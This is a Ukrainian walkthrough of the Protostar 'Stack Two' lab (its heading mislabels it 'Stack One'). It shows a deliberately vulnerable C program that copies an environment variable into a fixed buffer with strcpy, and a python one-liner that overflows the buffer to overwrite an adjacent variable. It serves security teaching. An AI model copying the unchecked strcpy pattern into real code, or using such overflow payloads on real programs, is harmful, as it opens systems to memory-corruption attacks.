## [Stack One](http://exploit.education/protostar/stack-two/)

На даному рівні розглядаються змінні середовища та те, як їх можна встановити.

Переходимо у директорію із завданням:  
```cd /opt/protostar/bin/```

Вихідний код:  
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

Тут ми маємо схожу ситуацію до Stack1. Але є дві великі відмінності. По-перше, ```strcpy()``` використовує змінну, яка походить із створеної змінної середовища ```GREENIE```. 
По-друге, шістнадцяткові значення 0x0d та 0x0a відповідають поверненню каретки та новому рядку відповідно, які ми не можемо ввести у вигляді символів (наприклад, як 'abcd' у Stack1).

Змінну оточення можна легко задати, використовуючи команду ```export```:  
```export GREENIE=test_env```

Для перевірки можна використати наступну команду:  
```env | grep GREENIE```

У тому числі змінну оточення можна задати використовуючи код python:
```export GREENIE=$(python -c "print('python_test_env')")```

Стосовно другої проблеми, то можна просто використовувати формат '\x0d', який є у python.

Отже, маємо:  
```export GREENIE=$(python -c "print('a' * 64 + '\x0d\x0a\x0d\x0a'[::-1])"); ./stack2```